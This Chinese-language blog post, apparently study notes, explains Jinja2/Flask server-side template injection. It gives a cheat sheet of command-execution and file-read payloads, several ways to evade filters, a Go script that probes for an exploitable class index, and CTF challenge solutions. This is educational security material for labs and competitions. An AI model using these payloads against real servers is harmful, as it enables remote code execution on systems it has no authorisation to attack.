@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>SSTI模板注入 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-03-05">2024年3月5日</time>
+        
+        
+          <span class="post__readtime">24 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/zkaq/">#zkaq</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">SSTI模板注入</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="ssti模板注入攻击"><a href="#ssti模板注入攻击" class="headerlink" title="ssti模板注入攻击"></a>ssti模板注入攻击</h1><h1 id="SSIT模板注入攻击"><a href="#SSIT模板注入攻击" class="headerlink" title="SSIT模板注入攻击"></a>SSIT模板注入攻击</h1><p>中文名称服务端模板注入漏洞，也直接称为模板注入。当用户输入数据以不安全的方式嵌入到模板中时，就会发生模板注入。</p>
+<h2 id="什么是模板引擎"><a href="#什么是模板引擎" class="headerlink" title="什么是模板引擎?"></a>什么是模板引擎?</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档。</p>
+<h3 id="检测模板的方法"><a href="#检测模板的方法" class="headerlink" title="检测模板的方法"></a>检测模板的方法</h3><p><img src="/../../img/Typora/image-20240305191701226.png" alt="image-20240305191701226"></p>
+<h3 id="可利用类（不全）"><a href="#可利用类（不全）" class="headerlink" title="可利用类（不全）"></a>可利用类（不全）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">大多数利用的是os._wrap_close这个类</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__builtins__,它里面有eval()它的payload是 ==&gt;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;	</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、任意命令执行</span><br><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line">2、任意命令执行</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload</span><br><span class="line">3、任意命令执行</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">4、任意命令执行</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br><span class="line">5、任意命令执行</span><br><span class="line">&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">6、任意命令执行</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">7、文件读取</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br><span class="line"></span><br><span class="line">8.&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">9. &#123;%print(lipsum|attr(&quot;__globals__&quot;))|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上述payload来自https://tttang.com/archive/1698/#toc__5</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Python中的一些魔术方法和内置类"><a href="#Python中的一些魔术方法和内置类" class="headerlink" title="Python中的一些魔术方法和内置类"></a>Python中的一些魔术方法和内置类</h2><p><strong><em>_class</em>_</strong>    &#x3D;&#x3D;&gt; 用于返回该对象所属的类</p>
+<p><img src="/../../img/Typora/image-20240605142916433.png" alt="image-20240605142916433"></p>
+<p><strong><em>_base</em>_</strong>  &#x3D;&#x3D;&gt;  用于返回对象的基类(父类)</p>
+<p><img src="/../../img/Typora/image-20240605143115571.png" alt="image-20240605143115571"></p>
+<p><img src="/../../img/Typora/image-20240605143421786.png" alt="image-20240605143421786"></p>
+<p><strong><em>_mro</em>_</strong> &#x3D;&#x3D;&gt; 返回解析方法调用的顺序</p>
+<p><img src="/../../img/Typora/image-20240605144259482.png" alt="image-20240605144259482"></p>
+<p><img src="/../../img/Typora/image-20240605144343114.png" alt="image-20240605144343114"></p>
+<p><img src="/../../img/Typora/image-20240605144317554.png" alt="image-20240605144317554"></p>
+<p><strong><em>_subclasses</em>_</strong> ()  &#x3D;&#x3D;&gt; 返回当前类的所有子类</p>
+<p><img src="/../../img/Typora/image-20240605144529888.png" alt="image-20240605144529888"></p>
+<h2 id="常用的过滤器"><a href="#常用的过滤器" class="headerlink" title="常用的过滤器"></a>常用的过滤器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">length() # 获取一个序列或者字典的长度并将其返回</span><br><span class="line"></span><br><span class="line">int()：# 将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：# 将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：# 将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：# 将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">reverse()：# 反转字符串；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： # 将value中的old替换为new</span><br><span class="line"></span><br><span class="line">list()：# 将变量转换为列表类型；</span><br><span class="line"></span><br><span class="line">string()：# 将变量转换成字符串类型；</span><br><span class="line"></span><br><span class="line">join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span><br><span class="line"></span><br><span class="line">attr(): # 获取对象的属性</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SSTI常见的绕过方式"><a href="#SSTI常见的绕过方式" class="headerlink" title="SSTI常见的绕过方式"></a>SSTI常见的绕过方式</h1><h3 id="当-‘-‘-被过滤时，有以下几种绕过方式"><a href="#当-‘-‘-被过滤时，有以下几种绕过方式" class="headerlink" title="当 ‘ _  ‘ 被过滤时，有以下几种绕过方式"></a>当 ‘ _  ‘ 被过滤时，有以下几种绕过方式</h3><ol>
+<li><p>用16进制编码绕过  <code>__class__  ==&gt;  \x5f\x5fclass\x5f\x5f</code></p>
+</li>
+<li><p>用list获取一个字符列表，然后用pop来取一个 ‘ _ ‘</p>
+<p><code>比如用config中取出一个_    ==&gt;  &#123;%set a=(config|list|last|list).pop(3)%&#125;&#123;%print(a)%&#125;</code></p>
+</li>
+</ol>
+<h3 id="当-‘-’被过滤是，有一下几种绕过方式"><a href="#当-‘-’被过滤是，有一下几种绕过方式" class="headerlink" title="当 ‘  .  ’被过滤是，有一下几种绕过方式"></a>当 ‘  .  ’被过滤是，有一下几种绕过方式</h3><ol>
+<li>用[]来绕过  <code>&#123;&#123;"".__class__.__base__&#125;&#125;  ==&gt; &#123;&#123;""['__class__']['__base__']&#125;&#125;</code></li>
+<li>使用过滤器attr()绕过  <code>&#123;&#123;"".__class__&#125;&#125;   ==&gt; &#123;&#123;""|attr('__class__')&#125;&#125;</code></li>
+</ol>
+<h3 id="当-被过滤的时候"><a href="#当-被过滤的时候" class="headerlink" title="当[]被过滤的时候"></a>当[]被过滤的时候</h3><ol>
+<li>用<code>__getitem__</code>魔术方法来进行绕过<code>__subclasses__()[0]  ==&gt; __subclasses__().__getitem__（0）</code></li>
+</ol>
+<p><img src="/../../img/Typora/image-20240630234434004.png" alt="image-20240630234434004"></p>
+<h3 id="当单引号和双引号被过滤的时候"><a href="#当单引号和双引号被过滤的时候" class="headerlink" title="当单引号和双引号被过滤的时候"></a>当单引号和双引号被过滤的时候</h3><ol>
+<li>单引号和双引号被过滤的时候，可以用<code>request.args.a </code>Get传参的方式来绕过来绕过<code>a为参数名</code></li>
+</ol>
+<p><img src="/../../img/Typora/image-20240605161801452.png" alt="image-20240605161801452"></p>
+<h3 id="当args被过滤的时候"><a href="#当args被过滤的时候" class="headerlink" title="当args被过滤的时候"></a>当args被过滤的时候</h3><ol>
+<li>用<code>request.cookies  /request.values等  来代替 request.args</code>         <code>request.values</code>接收post传参</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line"></span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line"></span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line"></span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line"></span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line"></span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line"></span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="当数字被过滤的时候"><a href="#当数字被过滤的时候" class="headerlink" title="当数字被过滤的时候"></a>当数字被过滤的时候</h3><ol>
+<li><p>这个时候我们可以通过count来得到数字   <code>&#123;&#123;(dict(e=a)|join|count)&#125;&#125; </code> &#x3D;&#x3D;&gt; 输出 1</p>
+<p><code>count</code> 通常用于计算集合（如列表、字典等）中的元素数量</p>
+</li>
+</ol>
+<p><img src="/../../img/Typora/image-20240630234533509.png" alt="image-20240630234533509"></p>
+<h3 id="当关键字被过滤的时候"><a href="#当关键字被过滤的时候" class="headerlink" title="当关键字被过滤的时候"></a>当关键字被过滤的时候</h3><ol>
+<li>当<code>class</code> 、<code>base</code>这类关键字被过滤的时候，用join拼接的方式绕过</li>
+</ol>
+<p><img src="/../../img/Typora/image-20240605160907110.png" alt="image-20240605160907110"></p>
+<ol start="2">
+<li><p>“ + ”拼接 <code>&#123;&#123;""['__class__']&#125;&#125;   ==&gt;&#123;&#123;""[‘__cla’+’ss__’]&#125;&#125;</code></p>
+</li>
+<li><p>Jinjia2中的~拼接<code>&#123;&#123;""['__class__']&#125;&#125;  ==&gt; &#123;%set a='__cla'%&#125;&#123;%set b='ss__'%&#125;&#123;&#123;""[a~b]&#125;&#125;</code></p>
+</li>
+</ol>
+<h3 id="使用Unicode编码"><a href="#使用Unicode编码" class="headerlink" title="使用Unicode编码"></a>使用Unicode编码</h3><p><code>&#123;&#123;“”|attr("class")&#125;&#125;  ==&gt; &#123;&#123;""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;</code></p>
+<h3 id="使用16进制编码"><a href="#使用16进制编码" class="headerlink" title="使用16进制编码"></a>使用16进制编码</h3><p><code>&#123;&#123;""|attr("__class__")&#125;&#125;  ==&gt; &#123;&#123;""|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")&#125;&#125;</code></p>
+<h3 id="使用格式化字符串"><a href="#使用格式化字符串" class="headerlink" title="使用格式化字符串"></a>使用格式化字符串</h3><p><code>&#123;&#123;()|attr("%c%cclass%c%c"%(95,95,95,95))&#125;&#125;  ==&gt; &#123;&#123;()|attr(__class__)&#125;&#125; </code></p>
+<p>如果是post方式提交， 需要将% 进行url编码 编码成%25， 因为在 URL中%是一个特殊字符</p>
+<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>先检查模板</p>
+<p><img src="/../../img/Typora/image-20240305194249962.png" alt="image-20240305194249962"></p>
+<p><img src="/../../img/Typora/image-20240305194306926.png" alt="image-20240305194306926"></p>
+<p>则模板可能是Jinjia2或者Twig</p>
+<p>Jinjia2模板是基于Python语言开发</p>
+<p>jinja2payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &quot;&quot;.__class__.__base__.__subclasses__():%&#125;</span><br><span class="line">  &#123;%if c.__name__ == &quot;_wrap_close&quot;:%&#125;</span><br><span class="line">    &#123;&#123;c.__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;</span><br><span class="line">  &#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload分析</strong></p>
+<ol>
+<li>Python中访问空字符串””的类的父类的所有子类。</li>
+<li><code>&#123;%if c.__name__ == "_wrap_close":%&#125;`：这是一个条件语句，检查当前子类（c）的名称是否为"_wrap_close"。
+3. `&#123;&#123;c.__init__.__globals__['popen']("ls /").read()&#125;&#125;`：如果前面的条件成立，这段代码将执行命令`ls /`，并尝试读取其输出。
+4. `&#123;%endif%&#125;</code>：结束条件语句块。</li>
+<li><code>&#123;%endfor%&#125;</code>：结束循环语句块。</li>
+</ol>
+<p>拼接</p>
+<p><img src="/../../img/Typora/image-20240305195152219.png" alt="image-20240305195152219"></p>
+<h2 id="flask应用的介绍及搭建"><a href="#flask应用的介绍及搭建" class="headerlink" title="flask应用的介绍及搭建"></a>flask应用的介绍及搭建</h2><p><strong>flask</strong>:flask是一个使用Python编写的轻量级的Web应用框架</p>
+<p>flask的WSGI工具箱采用Werkzeug, 模板引擎采用Jinja2. flask采用BSD授权</p>
+<p><strong>flask的特点有</strong>:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、集成支持单元测试、RESTful请求调度、支持安全cookies、基于Unicode </p>
+<p>Python 可以直接用flask启动一个Web服务页面</p>
+<p>Flask的基本架构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)  # __name__是系统变量,指的是本py文件的文件名</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)         # 路由</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello Yliken!&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>程序运行之后会在127.0.0.1地址的5000端口进行监听</p>
+<p><img src="/../../img/Typora/image-20240512165147567.png" alt="image-20240512165147567"></p>
+<p><img src="/../../img/Typora/image-20240512165039648.png" alt="image-20240512165039648"></p>
+<p>若想要让程序同时监听局域网,可在app,run里面加上 host &#x3D; ‘0.0.0.0’ 同时可以使用port &#x3D; 8080让其监听8080端口. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)  # __name__是系统变量,指的是本py文件的文件名</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)         # 路由</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello Yliken!&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/Typora/image-20240512165739109.png" alt="image-20240512165739109"> </p>
+<h2 id="Simple-SSTI-1（BugKu平台）"><a href="#Simple-SSTI-1（BugKu平台）" class="headerlink" title="Simple_SSTI_1（BugKu平台）"></a>Simple_SSTI_1（BugKu平台）</h2><p>最基础的一题没任何过滤</p>
+<p>找<code>os.__wrap__.close</code>类的脚本</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">toFindWrap</span><span class="params">(url <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;开始寻找os._wrap_close类&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">300</span>; i++ &#123;</span><br><span class="line">       Client := http.Client&#123;&#125;</span><br><span class="line">       payload := fmt.Sprintf(<span class="string">&quot;&#123;&#123;\&quot;\&quot;.__class__.__base__.__subclasses__()[%d]&#125;&#125;&quot;</span>, i)</span><br><span class="line">       req, _ := http.NewRequest(<span class="string">&quot;Get&quot;</span>, url, <span class="literal">nil</span>)</span><br><span class="line">       param := req.URL.Query()</span><br><span class="line">       param.Add(<span class="string">&quot;flag&quot;</span>, payload)</span><br><span class="line">       req.URL.RawQuery = param.Encode()</span><br><span class="line">       res, _ := Client.Do(req)</span><br><span class="line">       <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">       body, _ := io.ReadAll(res.Body)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> strings.Contains(<span class="type">string</span>(body), <span class="string">&quot;wrap_&quot;</span>) &#123;</span><br><span class="line"></span><br><span class="line">          fmt.Println(<span class="string">&quot;payload --&gt;&quot;</span>, payload)</span><br><span class="line">          fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ur := <span class="string">&quot;http://114.67.175.224:13152/&quot;</span></span><br><span class="line">    toFindWrap(ur)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/Typora/image-20240727181612625.png" alt="image-20240727181612625"></p>
+<h2 id="2024zkaq五月擂台赛"><a href="#2024zkaq五月擂台赛" class="headerlink" title="2024zkaq五月擂台赛"></a>2024zkaq五月擂台赛</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    &#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">23</span><br><span class="line">&#123;&#123;dict(a=a,b=c)|count&#125;&#125;</span><br><span class="line"></span><br><span class="line">获取数字24 &#123;%set a=dict(a=a,b=b,c=c)|count%&#125;&#123;%set num=a*a*a-a%&#125;&#123;%print num%&#125;</span><br><span class="line"></span><br><span class="line">获取_  ==&gt;  &#123;%set a=dict(a=a,b=b,c=c)|count%&#125;&#123;%set num=a*a*a-a%&#125;&#123;%set xia=a|select|string|list|attr(dict(p=a,op=b)|join)(num)%&#125;</span><br><span class="line"></span><br><span class="line">获取__globals  ==&gt;  &#123;%set a=dict(a=a,b=b,c=c)|count%&#125;&#123;%set num=a*a*a-a%&#125;&#123;%set x=a|select|string|list|attr(dict(p=a,op=b)|join)(num)%&#125;&#123;%set u=(dict(url=a)|join,x,dict(for=a)|join)|join%&#125;&#123;%set g=(x,x,dict(glob=a,als=b)|join,x,x)|join%&#125;&#123;&#123;g&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload: ==&gt;&#123;%set a=dict(a=a,b=b,c=c)|count%&#125;&#123;%set num=a*a*a-a%&#125;&#123;%set x=a|select|string|list|attr(dict(p=a,op=b)|join)(num)%&#125;&#123;%set g=(x,x,dict(glob=a,als=b)|join,x,x)|join%&#125;&#123;%set e=(x,x,dict(ge=a,titem=b)|join,x,x)|join%&#125;&#123;%set p=(dict(popen=a)|join)|join%&#125;&#123;&#123;(lipsum|attr(g)|attr(e)(dict(os=a)|join)|attr(p)(request.values.m))|attr(dict(read=a)|join)()&#125;&#125;&amp;m=ls</span><br><span class="line"></span><br><span class="line">//payload 太长不合格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">官方payload</span><br><span class="line">&#123;%set d=dict%&#125;&#123;%set a=d(ge=a,t=a)|join%&#125;&#123;%set b=d(ar=a,gs=a)|join%&#125;&#123;%set u=request|attr(b)|attr(a)%&#125;&#123;&#123;lipsum|attr(u(d(g=a)|join))|attr(u(d(e=a)|join))(d(os=a)|join)|attr(d(popen=a)|join)(u(d(m=a)|join))|attr(d(read=a)|join)()&#125;&#125;&amp;g=__globals__&amp;e=__getitem__&amp;m=cat /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST http://8f783fe0-b33b-42ad-92dd-3748acfff8f4.node5.buuoj.cn:81/ HTTP/1.1</span><br><span class="line">Host: 8f783fe0-b33b-42ad-92dd-3748acfff8f4.node5.buuoj.cn:81</span><br><span class="line">Content-Length: 333</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Origin: http://8f783fe0-b33b-42ad-92dd-3748acfff8f4.node5.buuoj.cn:81</span><br><span class="line">Referer: http://8f783fe0-b33b-42ad-92dd-3748acfff8f4.node5.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">code=&#123;%set o1=(dict(o=a,s=n))|join%&#125;</span><br><span class="line">&#123;%set re=(dict(re=a,ad=n))|join%&#125;&#123;%set pppct=(dict(po=a,pen=n))|join%&#125;</span><br><span class="line">&#123;%set%20a=(lipsum|string|list)|attr(%27pop%27)(18)%&#125;</span><br><span class="line">&#123;%set%20glob=(a,a,(dict(glo=a,bals=b)|join),a,a)|join%&#125;</span><br><span class="line">&#123;%set gt=(a,a,(dict(geti=a,tem=n)|join),a,a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glob)|attr(gt)(o1)|attr(pppct)(&#x27;tac fla*&#x27;)|attr(re)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="2024“源鲁杯”高校网络安全技能大赛"><a href="#2024“源鲁杯”高校网络安全技能大赛" class="headerlink" title="2024“源鲁杯”高校网络安全技能大赛"></a>2024“源鲁杯”高校网络安全技能大赛</h1><p>题目中<code>&#123;&#123;&#125;&#125;</code>  <code>set</code>被禁 if语句来进行判断</p>
+<p><code>os</code>中的<code>popen</code>被禁 通过<code>system</code>来进行命令执行</p>
+<p>当<code>system</code>正确执行一条语句的时候 返回 <code>0</code> 此时<code>&#123;%endif%&#125;</code>前面的<code>1</code>不会被打印到页面</p>
